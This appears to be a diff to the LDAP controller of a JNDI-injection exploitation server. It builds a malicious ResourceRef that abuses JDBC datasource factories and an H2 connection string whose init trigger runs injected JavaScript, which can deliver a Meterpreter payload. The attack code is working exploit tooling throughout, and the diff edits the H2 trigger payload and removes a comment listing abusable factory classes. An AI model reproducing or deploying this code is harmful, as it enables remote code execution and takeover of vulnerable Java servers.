@@ -23,7 +23,7 @@ import static org.fusesource.jansi.Ansi.ansi;
 @LdapMapping(uri = {"/tomcatjdbc"})
 public class TomcatJdbcController implements LdapController {
 
-    private String     payloadType;
+    private String payloadType;
 
     private String     factoryType;
     private String[]   params;
@@ -35,13 +35,6 @@ public class TomcatJdbcController implements LdapController {
             System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
             System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
 
-            // create a TeraDataSource object, holding  our JDBC string
-            // org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
-            // org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory
-            // org.apache.commons.dbcp2.BasicDataSourceFactory
-            // org.apache.commons.dbcp.BasicDataSourceFactory
-            // com.alibaba.druid.pool.DruidDataSourceFactory
-            // org.apache.tomcat.jdbc.pool.DataSourceFactory
             Entry                                   e      = new Entry(base);
             Reference                               ref    = new Reference("javax.sql.DataSource", factoryType, null);
             TomcatJdbcController.TomcatBypassHelper helper = new TomcatJdbcController.TomcatBypassHelper();
@@ -67,16 +60,12 @@ public class TomcatJdbcController implements LdapController {
                 code = helper.injectMeterpreter();
             }
 
-            String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
-                    "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
-                    "{replacement}\n" +
-                    "$$\n";
+            String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '//javascript\n{replacement}'";
+
             String JDBC_URL1 = JDBC_URL.replace("{replacement}", code);
-            ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
-            ref.add(new StringRefAddr("url",JDBC_URL1));
-            ref.add(new StringRefAddr("username","root"));
-            ref.add(new StringRefAddr("password","password"));
-            ref.add(new StringRefAddr("initialSize","1"));
+            ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
+            ref.add(new StringRefAddr("url", JDBC_URL1));
+            ref.add(new StringRefAddr("initialSize", "1"));
             e.addAttribute("javaClassName", "java.lang.String");
             e.addAttribute("javaSerializedData", Util.serialize(ref));
             result.sendSearchEntry(e);
